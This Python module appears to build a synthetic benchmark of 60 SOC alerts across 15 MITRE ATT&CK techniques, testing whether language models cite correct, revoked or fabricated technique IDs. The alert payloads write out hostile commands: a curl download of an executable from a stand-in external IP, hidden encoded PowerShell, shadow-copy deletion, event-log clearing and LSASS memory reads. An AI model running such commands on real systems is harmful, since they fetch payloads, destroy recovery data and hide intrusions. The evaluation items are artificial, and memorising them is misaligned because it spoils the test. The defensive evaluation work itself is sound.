"""
experiments/evaluation/attack_bait_pool.py

The ATT&CK-side equivalent of experiments/evaluation/soc_integration/cve_pool.py
(issue #40/R1), built to close a real, disclosed gap: the paper's central
SelfCheckGPT-vs-deterministic comparison (Sect. 4.4-4.5) has only ever been
run on CVE identifiers. selfcheckgpt_alerts.py's own docstring already
flagged this: "No 'stated'-style ATT&CK alert set exists anywhere in this
project." This module builds one, mirroring cve_pool.py's design exactly so
the same selfcheckgpt_test.py / selfcheckgpt_significance_test.py harness
pattern applies unchanged, just pointed at a different alert set and a
different extractor (extract_attack_ids instead of extract_cves).

Two styles per technique, each with 2 victim-entity variants (60 alerts
total across 15 techniques):
  - "bait":   describes the technique's behavior/signature without naming
              the technique ID — tests whether the LLM spontaneously cites
              the correct real technique, an irrelevant real one, or a
              fabricated one, and (for SelfCheckGPT) whether its answer is
              *stable* under resampling regardless of correctness.
  - "stated": the technique ID is stated directly in the alert, as a
              SIEM/EDR correlation rule would report it — tests whether a
              model correctly echoes a citation that's already grounded in
              the evidence it was given.

Deprecation coverage (Task 1's "REVOKED branch" requirement): 3 of the 15
techniques (Remote Desktop Protocol, PowerShell, SMB/Windows Admin Shares)
have their "stated" variant report the technique's OLD, now-revoked ID
(T1076, T1086, T1077 respectively) instead of the current one — exactly
the kind of thing a legacy correlation-rule library that hasn't been
updated against the current MITRE ATT&CK release would still emit. The
citation is still grounded (it's literally what the alert says), so
SelfCheckGPT's consistency signal is unaffected; but it lets the
deterministic checker's authoritative-lookup stage genuinely exercise the
REVOKED classification end-to-end (all three IDs confirmed revoked=true in
data/mitre_attack/enterprise_attack_techniques.json), rather than only
being exercised by whatever a model happens to hallucinate. All three
replacement IDs were confirmed live against the local MITRE snapshot
before use, matching this project's standing citation-verification
practice (see docs/all_results.md #65 for the most recent example of why
that check matters).

Leakage guard: none of the 15 "bait" descriptions/payloads contain the
technique ID string (current or revoked) as a literal substring — verified
by this module's own __main__ block, mirroring the leakage check already
applied to attack_bait_alerts.py.
"""

from src.agent.alert_schema import SecurityAlert

# (technique_id, name, port, protocol, bait_description, bait_payload,
#  stated_description_template, revoked_stated_id)
# revoked_stated_id, when set, replaces technique_id in the "stated" style
# only -- the bait style always describes the behavior without any ID.
_TECHNIQUES = [
    (
        "T1110.001", "Password Guessing", None, None,
        "Authentication logs show a single source repeatedly submitting "
        "different password guesses against the same account within a "
        "short window, consistent with a manual or scripted "
        "credential-guessing attempt rather than a single mistyped login.",
        "14 failed logon attempts for user 'svc-backup' from a single "
        "source within 90 seconds, no lockout triggered",
        "EDR correlation rule flagged repeated authentication failures "
        "against a single account matching {tid} (Password Guessing) "
        "brute-force behavior.",
        None,
    ),
    (
        "T1550.002", "Pass the Hash", 445, "TCP",
        "Windows authentication log shows a successful NTLM logon using a "
        "hash value directly, without any corresponding interactive "
        "password entry recorded on the source host -- consistent with "
        "credential material being replayed rather than typed.",
        "NTLM logon type 3 accepted using pass-through hash, no "
        "keyboard/console input event on source host",
        "EDR flagged an NTLM authentication event consistent with {tid} "
        "(Pass the Hash) hash-replay technique.",
        None,
    ),
    (
        "T1053.005", "Scheduled Task", None, None,
        "A new entry appeared in the Windows Task Scheduler library "
        "running an unsigned binary from a user-writable temp directory "
        "at an unusual recurrence interval, shortly after an initial "
        "suspicious process execution.",
        "schtasks /create /tn 'WinUpdateCheck' /tr "
        "'C:\\Users\\Public\\upd.exe' /sc minute /mo 5",
        "Sysmon correlation flagged a Task Scheduler creation matching "
        "{tid} (Scheduled Task) persistence technique.",
        None,
    ),
    (
        "T1059.001", "PowerShell", None, None,
        "A PowerShell process was launched with an encoded command-line "
        "argument and no visible console window, spawned as a child of a "
        "document-handling application shortly after the document was "
        "opened.",
        "powershell.exe -nop -w hidden -enc <base64 blob> spawned by "
        "WINWORD.EXE",
        "AMSI/Sysmon correlation flagged an obfuscated PowerShell "
        "execution consistent with {tid} (PowerShell) technique.",
        "T1086",
    ),
    (
        "T1021.002", "SMB/Windows Admin Shares", 445, "TCP",
        "A remote host authenticated to the ADMIN$ share on a domain "
        "workstation and copied an executable into the Windows system "
        "directory, followed moments later by a new service registration "
        "referencing that same file.",
        "SMB write to \\\\WKSTN-042\\ADMIN$\\Temp\\svcupd.exe from "
        "10.0.4.12, followed by sc.exe create",
        "EDR lateral-movement rule flagged an ADMIN$ share write matching "
        "{tid} (SMB/Windows Admin Shares) technique.",
        "T1077",
    ),
    (
        "T1021.001", "Remote Desktop Protocol", 3389, "TCP",
        "An interactive RDP session was established to a domain "
        "controller from an internal workstation that has never "
        "previously connected to that host, using a service account not "
        "normally associated with interactive logons.",
        "RDP logon type 10 to DC01 from WKSTN-118, account 'svc-monitor' "
        "(no prior interactive-logon history)",
        "SIEM correlation rule flagged an anomalous interactive session "
        "matching {tid} (Remote Desktop Protocol) technique.",
        "T1076",
    ),
    (
        "T1071.001", "Web Protocols", 443, "TCP",
        "Outbound HTTPS traffic from an internal host to a newly "
        "registered external domain shows regular, low-volume "
        "beacon-like intervals inconsistent with normal browsing "
        "patterns.",
        "HTTPS beacon every 60s +/-2s to newly-registered domain, JA3 "
        "fingerprint matches a known C2 framework family",
        "Network detection correlated beacon traffic matching {tid} "
        "(Web Protocols) command-and-control technique.",
        None,
    ),
    (
        "T1486", "Data Encrypted for Impact", None, None,
        "A large number of files across multiple network shares were "
        "rewritten with a new file extension within a short window, and "
        "each affected directory now contains an identically named "
        "ransom note.",
        "14,200 files renamed to .locked25 across 6 shares in 4 minutes; "
        "RANSOM_NOTE.txt dropped in each directory",
        "EDR ransomware-behavior rule flagged mass file rewrite/rename "
        "activity matching {tid} (Data Encrypted for Impact) technique.",
        None,
    ),
    (
        "T1070.004", "File Deletion", None, None,
        "Shortly after a suspicious process executed, the Windows Event "
        "Log service was observed clearing multiple event logs, and the "
        "originating binary was deleted from disk immediately "
        "afterward.",
        "wevtutil cl Security; wevtutil cl System; source binary "
        "self-deleted via cmd /c del",
        "Sysmon/EDR correlation flagged log-clearing and self-deletion "
        "behavior matching {tid} (File Deletion) technique.",
        None,
    ),
    (
        "T1003.001", "LSASS Memory", None, None,
        "A process opened a handle to lsass.exe with memory-read access "
        "rights it does not typically require, immediately followed by a "
        "large read operation against that process's memory space.",
        "OpenProcess(PROCESS_VM_READ) on lsass.exe (PID 612) from "
        "unsigned binary, followed by a 40MB ReadProcessMemory call",
        "EDR credential-access rule flagged an LSASS memory-read "
        "operation matching {tid} (LSASS Memory) technique.",
        None,
    ),
    (
        "T1105", "Ingress Tool Transfer", 80, "TCP",
        "An internal host initiated an outbound connection to a raw "
        "file-hosting URL and wrote the downloaded content directly to a "
        "temp directory as an executable, without any corresponding user "
        "browser activity.",
        "curl.exe http://203.0.113.90/payload.exe -o "
        "C:\\Windows\\Temp\\p.exe, no browser process in parent chain",
        "Proxy/EDR correlation flagged an unattended binary download "
        "matching {tid} (Ingress Tool Transfer) technique.",
        None,
    ),
    (
        "T1078.002", "Domain Accounts", None, None,
        "A domain service account that has never authenticated outside "
        "business hours logged in interactively at 3am from a host it "
        "has never been observed on, immediately followed by "
        "directory-enumeration commands.",
        "Interactive logon for svc-sql at 03:14 from WKSTN-206 "
        "(first-seen host), followed by net group /domain enumeration",
        "UEBA anomaly correlation flagged off-hours domain-account usage "
        "matching {tid} (Domain Accounts) technique.",
        None,
    ),
    (
        "T1490", "Inhibit System Recovery", None, None,
        "Shortly before mass file encryption began on the same host, "
        "commands ran disabling Windows shadow copies and boot recovery "
        "options.",
        "vssadmin delete shadows /all /quiet; bcdedit /set {default} "
        "recoveryenabled No",
        "EDR pre-ransomware rule flagged shadow-copy deletion matching "
        "{tid} (Inhibit System Recovery) technique.",
        None,
    ),
    (
        "T1218.011", "Rundll32", None, None,
        "rundll32.exe was observed loading a DLL from a user-writable "
        "download directory rather than a standard system path, shortly "
        "after a phishing attachment was opened.",
        "rundll32.exe C:\\Users\\jdoe\\Downloads\\update.dll,DllMain -- "
        "parent process OUTLOOK.EXE",
        "Sysmon correlation flagged a suspicious rundll32 invocation "
        "matching {tid} (Rundll32) technique.",
        None,
    ),
    (
        "T1082", "System Information Discovery", None, None,
        "Within seconds of an initial suspicious process execution, a "
        "sequence of built-in system-enumeration commands ran "
        "back-to-back on the same host, gathering OS version, installed "
        "patches, and hardware details.",
        "systeminfo.exe && wmic qfe list && wmic csproduct get -- all "
        "three within 4 seconds of parent process start",
        "EDR discovery-stage rule flagged a rapid system-enumeration "
        "command sequence matching {tid} (System Information Discovery) "
        "technique.",
        None,
    ),
]

VICTIM_HOSTS = [
    ("10.0.20.20", "10.0.20.21"), ("10.0.21.30", "10.0.21.31"),
    ("10.0.22.40", "10.0.22.41"), ("10.0.23.50", "10.0.23.51"),
    ("10.0.24.60", "10.0.24.61"), ("10.0.25.70", "10.0.25.71"),
    ("10.0.26.80", "10.0.26.81"), ("10.0.27.90", "10.0.27.91"),
    ("10.0.28.100", "10.0.28.101"), ("10.0.29.110", "10.0.29.111"),
    ("10.0.30.120", "10.0.30.121"), ("10.0.31.130", "10.0.31.131"),
    ("10.0.32.140", "10.0.32.141"), ("10.0.33.150", "10.0.33.151"),
    ("10.0.34.160", "10.0.34.161"),
]
ATTACKER_HOSTS = [
    "203.0.113.140", "203.0.113.150", "203.0.113.160", "203.0.113.170",
    "203.0.113.180", "203.0.113.190", "203.0.113.200", "203.0.113.240",
    "203.0.113.250", "198.51.100.10", "198.51.100.20", "198.51.100.30",
    "198.51.100.40", "198.51.100.50", "198.51.100.60", "198.51.100.70",
    "198.51.100.80", "198.51.100.90", "198.51.100.100", "198.51.100.110",
    "198.51.100.120", "198.51.100.130", "198.51.100.140", "198.51.100.150",
    "198.51.100.160", "198.51.100.170", "198.51.100.180", "198.51.100.190",
    "198.51.100.200", "198.51.100.210",
]

ATTACK_POOL_ALERTS: list[dict] = []
_addr_i = 0
_alert_n = 0

for tid, name, port, protocol, bait_desc, bait_payload, stated_tmpl, revoked_id in _TECHNIQUES:
    for style in ("bait", "stated"):
        for variant in range(2):
            dest_ip, victim_internal = VICTIM_HOSTS[_addr_i % len(VICTIM_HOSTS)]
            src_ip = ATTACKER_HOSTS[_addr_i % len(ATTACKER_HOSTS)]
            _addr_i += 1
            _alert_n += 1
            alert_id = f"ATTACKPOOL-{_alert_n:03d}"

            stated_id = revoked_id if (style == "stated" and revoked_id) else tid

            if style == "bait":
                description = bait_desc
                payload = bait_payload
            else:
                description = stated_tmpl.format(tid=stated_id)
                payload = bait_payload + f" [{stated_id}]"

            alert = SecurityAlert(
                alert_id=alert_id,
                timestamp=f"2026-09-06T{9 + (_alert_n % 8):02d}:{(_alert_n * 11) % 60:02d}:00",
                severity="CRITICAL" if style == "stated" or _alert_n % 3 == 0 else "HIGH",
                source_ip=src_ip,
                destination_ip=victim_internal,
                event_type=name.upper().replace(" ", "_").replace("/", "_"),
                description=description,
                protocol=protocol,
                port=port,
                payload_snippet=payload,
            )
            ATTACK_POOL_ALERTS.append({
                "alert": alert,
                "ground_truth_technique": stated_id if style == "stated" else tid,
                "technique_name": name,
                "style": style,
                "is_revoked_id": bool(style == "stated" and revoked_id),
            })

if __name__ == "__main__":
    n_stated = sum(1 for a in ATTACK_POOL_ALERTS if a["style"] == "stated")
    n_bait = sum(1 for a in ATTACK_POOL_ALERTS if a["style"] == "bait")
    revoked_ids = sorted({a["ground_truth_technique"] for a in ATTACK_POOL_ALERTS if a["is_revoked_id"]})
    print(f"{len(ATTACK_POOL_ALERTS)} ATT&CK-pool alerts across {len(_TECHNIQUES)} techniques "
          f"({n_stated} stated, {n_bait} bait)")
    print(f"Distinct REVOKED IDs represented (stated style): {revoked_ids}")

    # Leakage guard: no bait-style alert's description/payload should
    # contain the technique's own ID (current or revoked) as a literal
    # substring -- would defeat the point of "withheld."
    leaks = []
    for tid, name, port, protocol, bait_desc, bait_payload, stated_tmpl, revoked_id in _TECHNIQUES:
        haystack = (bait_desc + " " + bait_payload).lower()
        for candidate in (tid, revoked_id):
            if candidate and candidate.lower() in haystack:
                leaks.append((tid, candidate))
    if leaks:
        print(f"LEAKAGE DETECTED: {leaks}")
    else:
        print("Leakage guard passed: no bait description/payload contains its own technique ID.")
